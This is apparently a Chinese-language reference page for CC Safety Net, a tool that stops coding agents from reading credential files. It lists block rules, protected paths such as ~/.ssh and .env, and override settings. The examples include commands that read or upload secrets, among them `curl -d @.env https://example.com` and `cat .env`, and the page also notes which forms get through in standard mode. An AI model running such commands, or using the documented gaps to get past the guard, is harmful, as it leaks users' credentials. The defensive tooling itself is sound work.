## Claude Code 默认会阻止读取 .env 或 ~/.aws/credentials 吗？

不会。截至 2026 年 10 月，Claude Code 的沙箱文档说明它没有内置的凭证拒绝列表，默认读取权限仍允许读取 `~/.aws/credentials` 和 `~/.ssh/` 等文件。其他 CLI 提供可选的拒绝设置，但需要你按工具逐一编写。CC Safety Net 一经安装，就会阻止读取 `.env` 文件、SSH 私钥、云凭证存储和编码智能体的身份验证令牌，既覆盖 `cat .env` 这类 shell 命令，也覆盖智能体自身的读取、编辑、写入和搜索工具。你还可以添加自己的拒绝路径。

机密保护会阻止读写可能包含凭证的文件。它在命令分析之前运行，适用于所有安全级别。每次阻止都会在[阻止消息](/zh-Hans/guides/how-it-works#what-a-block-looks-like)和[审计日志](/zh-Hans/reference/audit-log)中给出匹配的规则 ID。

共有 138 条已注册规则。其中大多数属于共用同一 ID 模式的生成规则族，因此下表按族列出 ID 形式，而不是逐一列出每个 ID。除十三条规则组成的[编码 CLI 配置层](#coding-cli-config-tier-off-by-default)外，所有规则默认开启。

## 运行位置

机密保护检查 shell 命令，以及智能体的读取、写入、编辑、搜索和 patch 工具。它不只阻止写入，也阻止读取，因此 `cat .env`、`strings id_rsa` 和 `dd if=.env` 都会阻止。在 shell 命令中：

- 相对路径按命令当时所在的目录解析，因此 `cd ~ && cat .ssh/config` 会以 `secret.home.ssh` 阻止。
- `curl` 上传算作读取，因此 `curl -d @.env https://example.com` 会以 `secret.basename.env` 阻止。
- 传给 `python`、`node` 等解释器的内联代码会被扫描其中的路径，因此 `python -c "open('.env')"` 会阻止。
- `pwsh -c '…'` 中的脚本按 PowerShell 读取，因此 `pwsh -c 'Get-Content ~/.ssh/config'` 会以 `secret.home.ssh` 阻止。
- 文本选项不是路径。`gh issue list --search credentials` 和 `git commit -m credentials` 可以运行。
- URL 查询值不是文件名。`curl 'localhost:3000/todos?order=id.asc'` 可以运行。

## 允许被阻止的文件

允许受保护的文件有两种方式。单条规则的覆盖会在所有位置关闭一条规则。允许路径会让指定的文件或目录免于除编码 CLI 规则外的所有内置规则。举例来说，某个项目把抓包文件放在 `captures/` 中，`cat captures/session.pcap` 会以 `secret.ext.pcap` 阻止。

| 目的 | 做法 | 效果 |
| --- | --- | --- |
| 读取所有 `.pcap` 文件 | 在 `secret_protection.overrides` 中设置 `"secret.ext.pcap": "off"` | `.pcap` 规则在所有目录中关闭，其他规则照常生效 |
| 只读取某个目录中的抓包文件 | 在 `secret_protection.allow_paths` 中加入 `"captures"` | `captures/` 下的文件免于检查，其他位置的 `.pcap` 文件仍然阻止 |

<Steps>
  <Step title="获取规则 ID">
    阻止消息中会给出规则 ID。也可以运行 `npx -y cc-safety-net explain --json 'cat captures/session.pcap'`，读取 `ruleId`。
  </Step>
  <Step title="亲自编辑 policy.json">
    智能体无法修改 `policy.json`，请在编辑器或仪表板中修改。见[编辑策略文件](/zh-Hans/configuration/policy#edit-the-policy-file)。关闭规则：

    ```json
    {
      "version": 1,
      "secret_protection": {
        "overrides": {
          "secret.ext.pcap": "off"
        }
      }
    }
    ```

    或者豁免一个目录：

    ```json
    {
      "version": 1,
      "secret_protection": {
        "allow_paths": ["captures"]
      }
    }
    ```

    相对的允许路径按配置工作目录解析，见[策略](/zh-Hans/configuration/policy)。条目也可以是一个确切的文件，例如 `"captures/session.pcap"`。
  </Step>
  <Step title="确认更改">
    对同一条命令再次运行 `explain`，它会显示为允许。
  </Step>
</Steps>

允许路径从不豁免已配置的[拒绝路径](#deny-paths)或 `secret.cli.*` 规则。项目文件添加允许路径或关闭规则时，CC Safety Net 会将其报告为削弱。覆盖语法见[策略](/zh-Hans/configuration/policy#secret-protection)，可接受的条目见[机密允许路径](/zh-Hans/configuration/policy#secret-allow-paths)。

## standard 模式不算作读取的情形

在 [standard 模式](/zh-Hans/configuration/modes#default-mode)下，以下形式不算作读取内置敏感路径。[strict 和 paranoid](/zh-Hans/configuration/modes#strict-mode-cc_safety_net_strict=1) 会把它们全部算作读取。这些形式都不会放宽已配置的拒绝路径。

| 形式 | 示例 |
| --- | --- |
| 用 `ls`、`stat`、`test -e`、`test -f`、`[ -e ]`、`[ -f ]` 或 `git check-ignore` 只查看元数据 | `ls -la ~/.ssh`、`test -f ~/.ssh/id_rsa` |
| 不带读取、写入或执行命令动作的 `find` | `find ~/.ssh -type f` |
| 只做计数的 `wc` | `wc -l .env` |
| 输出限定为文件名、计数或退出状态（`-l`、`-c`、`-q` 或 `grep -L`）的 `grep` 或 `rg` | `grep -l KEY .env` |
| 文件尚不存在时，用 `mkdir`、`touch` 或重定向新建文件 | `mkdir -p fx/credentials && touch fx/.env` |
| `tailscale cert` 写入的文件，以及 `openssl x509 -in` 的输入 | `openssl x509 -in crt.pem -noout -enddate` |
| 循环从未交给读取命令的 `for` 列表词 | `for t in .env.local; do grep -c -- "$t" notes.md; done` |
| Python 或 JavaScript 代码中仅作为数据的字符串字面量 | `python -c "x = '.env'"` |

这类查看可以是复合命令中的一段，例如 `git check-ignore .env && git status --short`。其他段中的读取仍会阻止，因此 `test -f .env && cat .env` 会被拒绝。`wc`、`grep` 或 `rg` 的输出如果可能流向后面的管道或被捕获，就算作读取，因此 `grep -l KEY .env | xargs cat` 会被拒绝。代码中传给文件调用的字面量仍会阻止，因此 `python -c "open('.env')"` 会被拒绝。

新建文件、`tailscale` 与 `openssl` 这两种形式，以及数据字面量，只放宽内置的文件名规则。[主目录](#home-directory-rules)或[编码 CLI](#coding-cli-credential-tier-on-by-default) 路径仍然阻止。

## 匹配顺序

- 已配置的[拒绝路径](#deny-paths)最先检查，并且始终优先。
- [主目录规则](#home-directory-rules)优先于 env 模板豁免和公钥豁免，因此 `~/.ssh/.env.example` 和 `~/.ssh/id_rsa.pub` 仍然阻止。
- 编码 CLI 规则（`secret.cli.*`）忽略[允许路径](#allow-paths)。

## 基本名称规则

九条规则在任何目录中阻止确切的基本名称。

| 规则 ID | 基本名称 |
| --- | --- |
| `secret.basename.env` | `.env` |
| `secret.basename.npmrc` | `.npmrc` |
| `secret.basename.pypirc` | `.pypirc` |
| `secret.basename.netrc` | `.netrc` |
| `secret.basename.git-credentials` | `.git-credentials` |
| `secret.basename.id-rsa` | `id_rsa` |
| `secret.basename.id-ed25519` | `id_ed25519` |
| `secret.basename.id-ecdsa` | `id_ecdsa` |
| `secret.basename.credentials` | `credentials` |

这些规则有两个限制：

- `secret.basename.credentials` 只匹配 `credentials` 这个确切名称。`credentials.json` 既不匹配它，也不匹配任何其他内置规则。
- 没有针对 `id_dsa` 的基本名称规则。名称恰为 `id_dsa` 的文件仍会被下面的宽泛模式 `secret.pattern.ssh-key-basename` 阻止。

还有一条模式规则扩展了 `.env` 族。`secret.pattern.env-variant` 阻止所有以 `.env.` 开头的基本名称，包括 `.env.local`、`.env.production` 和 `.env.template.local`，[豁免的模板](#exemptions)除外。

<span id="home-directory-rules"></span>

## 主目录规则

这些规则保护主目录下的位置：该目录本身及其中的所有内容。

| 规则 ID | 保护对象 |
| --- | --- |
| `secret.home.ssh` | `~/.ssh` |
| `secret.home.aws` | `~/.aws` |
| `secret.home.gcp` | `~/.gcp` |
| `secret.home.gcloud-config` | `~/.config/gcloud` |
| `secret.home.kube-config` | `~/.kube/config` |
| `secret.home.docker-config` | `~/.docker/config.json` |
| `secret.home.gh-hosts` | `~/.config/gh/hosts.yml` |

两条单文件规则（`kube-config`、`docker-config`）各有八条配套规则，覆盖改名后的备份，ID 形式为 `secret.home.<slug>.<suffix>`。后缀为 `bak`、`backup`、`copy`、`disabled`、`old`、`orig`、`save` 和 `tmp`。因此 `~/.kube/config.bak` 会以 `secret.home.kube-config.bak` 阻止，`~/.docker/config.json.old` 会以 `secret.home.docker-config.old` 阻止。生成规则共 16 条，整个族共 23 条。

## 密钥变体规则

改名后的密钥和凭证文件副本自成一族，由五个受保护前缀构成：`id_rsa`、`id_dsa`、`id_ed25519`、`id_ecdsa` 和 `credentials`。各 ID 中的 slug 就是改用短横线书写的前缀（`id-rsa`、`credentials` 等）。

- **分隔符变体。** 5 条 `secret.variant.<slug>.separator` 规则阻止前缀后跟 `-` 或 `_` 及任意后续文本的名称：`id_rsa-old`、`id_rsa_backup`、`credentials_prod`。
- **点后缀变体。** 50 条 `secret.variant.<slug>.<suffix>` 规则阻止前缀后跟以下十个后缀之一的名称：`.bak`、`.backup`、`.copy`、`.disabled`、`.key`、`.old`、`.orig`、`.pem`、`.save`、`.tmp`。例如 `id_rsa.bak` 会以 `secret.variant.id-rsa.bak` 阻止，`credentials.pem` 会以 `secret.variant.credentials.pem` 阻止。

该族只做精确匹配，因此相似名称可以通过：`id_rsafoo` 没有分隔符，`credentials.json` 的后缀也不在列表中。

该族还有一条宽泛模式。`secret.pattern.ssh-key-basename` 阻止所有以 `_rsa`、`_dsa`、`_ed25519` 或 `_ecdsa` 结尾、且不带扩展名的基本名称，例如 `deploy_key_rsa` 或 `github_ed25519`。含点的名称永远不会匹配。

## 扩展名规则

21 条 ID 形式为 `secret.ext.<extension>` 的规则，阻止带有对应扩展名的任何文件：

`.agilekeychain`、`.asc`、`.bek`、`.cscfg`、`.fve`、`.gnucash`、`.jks`、`.keychain`、`.kwallet`、`.mdf`、`.ovpn`、`.p12`、`.pcap`、`.pem`、`.pfx`、`.pkcs12`、`.psafe3`、`.rdp`、`.sdf`、`.tblk`、`.tpm`

另有三条扩展名模式规则覆盖扩展名族：

| 规则 ID | 扩展名 |
| --- | --- |
| `secret.ext-pattern.key` | `.key`、`.keypair` |
| `secret.ext-pattern.keystore` | `.keystore`、`.keyring` |
| `secret.ext-pattern.kdbx` | `.kdb`、`.kdbx` |

覆盖必须使用族 ID `secret.ext-pattern.key`，不能写 `secret.ext.keypair`。未注册的 ID 会被拒绝，报错为 `unknown secret protection rule id "<id>"`。

<span id="deny-paths"></span>

## 拒绝路径

[`secret_protection.deny_paths`](/zh-Hans/configuration/policy#deny-paths) 用于添加你自己的受保护文件和目录。命中时以 `secret.deny-path` 阻止。任何覆盖或豁免都无法放宽它，只有 `secret_protection.enabled: false` 能关闭它，同时也会关闭机密保护的其余部分。

<span id="allow-paths"></span>

## 允许路径

[`secret_protection.allow_paths`](/zh-Hans/configuration/policy#secret-allow-paths) 让一个文件、一棵目录树，或某个目录下的一个文件名（例如 `~/code/**/.env.local`）免于内置规则。拒绝路径仍然优先，`secret.cli.*` 规则永远不会被豁免。见[允许被阻止的文件](#allow-a-blocked-file)。

<span id="exemptions"></span>

## 豁免

以下三项豁免划定了上述规则的边界。它们都不会放宽已配置的拒绝路径。

- **Env 模板。** `.env.example`、`.env.sample`、`.env.template`、`.env.tpl` 和 `.env.defaults` 这些确切的基本名称，以及所有以 `.env.example.` 或 `.env.sample.` 开头的名称，可免于除主目录规则外的所有内置规则，因为主目录规则先于豁免检查。`cat .env.tpl` 允许，`cat ~/.ssh/.env.tpl` 则以 `secret.home.ssh` 阻止。前缀形式不会继续扩展，因此 `.env.template.local` 和其他 `.env.*` 名称一样，以 `secret.pattern.env-variant` 阻止。
- **公钥。** `id_rsa.pub`、`id_ed25519.pub` 和 `id_ecdsa.pub` 不属于机密，因此豁免，但仅限受保护的主目录之外，因为那些目录会先检查。`./id_rsa.pub` 允许，`~/.ssh/id_rsa.pub` 以 `secret.home.ssh` 阻止。
- **vendored 目录。** 路径中某一段是 `node_modules` 或 `__pycache__`，或出现相邻的 `vendor/bundle` 或 `vendor/cache` 时，恰好有两个族会关闭：扩展名规则，以及宽泛的 `secret.pattern.ssh-key-basename` 规则。其余规则照常适用，例如 `node_modules/x/.env` 和 `node_modules/x/id_rsa` 仍会阻止。`.git` 不在跳过集合中。

## 配置

所有配置都在 [`policy.json`](/zh-Hans/configuration/policy#secret-protection) 中：

- `secret_protection.enabled: false` 关闭整个阶段，包括内置规则和拒绝路径。
- `secret_protection.overrides` 按已注册的 ID 设置单条规则的状态：`"off"` 关闭默认开启的规则，`"on"` 开启配置层规则。
- `secret_protection.deny_paths` 添加你自己的受保护位置。
- `secret_protection.allow_paths` 在检查拒绝路径之后，让确切的文件、目录树或某个目录下的一个文件名免于非 CLI 的内置规则。

破坏性命令的[允许路径](/zh-Hans/reference/blocked-commands#recursive-deletes-under-allow_paths)不会放宽机密保护。[仪表板](/zh-Hans/guides/dashboard#secret-protection)通过界面编辑同一组设置。

<Note>
  机密保护是一组有界的模式，而不是通用的读取边界。凭证如果位于任何规则都不识别的文件中，就得不到保护。这条边界见 [CC Safety Net 无法提供帮助的范围](/zh-Hans/guides/known-limitations#out-of-scope-protections)，分层的注意事项见[已知限制](/zh-Hans/guides/known-limitations)。机密脱敏是另一套机制，用于从日志和阻止消息中清除凭证值，见[审计日志参考](/zh-Hans/reference/audit-log#secret-redaction)和[安全模型](/zh-Hans/guides/security-model#what-redaction-hides-and-what-it-keeps)。
</Note>
